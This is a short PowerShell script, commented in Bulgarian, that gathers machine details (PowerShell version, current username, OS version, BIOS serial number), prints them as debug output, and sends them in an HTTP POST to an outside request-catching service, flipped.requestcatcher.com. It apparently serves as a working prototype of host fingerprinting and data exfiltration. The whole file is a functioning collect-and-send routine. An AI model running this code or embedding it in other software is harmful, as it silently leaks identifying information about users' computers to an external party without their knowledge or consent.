# ========== Глобална инициализация ==========
Set-Variable -Name output -Value "" -Scope Global

function Add-ToOutput {
    param([string]$Title, [object]$Data)
    $Global:output += "`n===== [$Title] =====`n"
    $Global:output += "$($Data | Out-String)`n"
}

# ========== Събиране на реална информация ==========
Add-ToOutput "PowerShell Version" $PSVersionTable.PSVersion
Add-ToOutput "Current User" (whoami)

try {
    $os = Get-CimInstance Win32_OperatingSystem
    Add-ToOutput "OS" "$($os.Caption) $($os.Version)"
} catch {
    Add-ToOutput "OS" "ERROR: $($_.Exception.Message)"
}

try {
    $bios = Get-CimInstance Win32_BIOS
    Add-ToOutput "BIOS Serial" $bios.SerialNumber
} catch {
    Add-ToOutput "BIOS Serial" "ERROR: $($_.Exception.Message)"
}

# ========== DEBUG: Показване на output ==========
Write-Host "`n========== DEBUG =========="
Write-Host "OUTPUT LENGTH: $($Global:output.Length)"
Write-Host "OUTPUT CONTENT:"
Write-Host $Global:output
Write-Host "==========================="

# ========== POST към RequestCatcher ==========
try {
    $preview = $Global:output.Substring(0, [Math]::Min(500, $Global:output.Length))
    $body = @{ debug = $preview }
    Invoke-WebRequest -Uri "https://flipped.requestcatcher.com/" `
                      -Method POST `
                      -Body $body `
                      -UseBasicParsing
    Write-Host "`nPOST sent successfully!"
} catch {
    Write-Host "`nPOST FAILED: $($_.Exception.Message)"
}
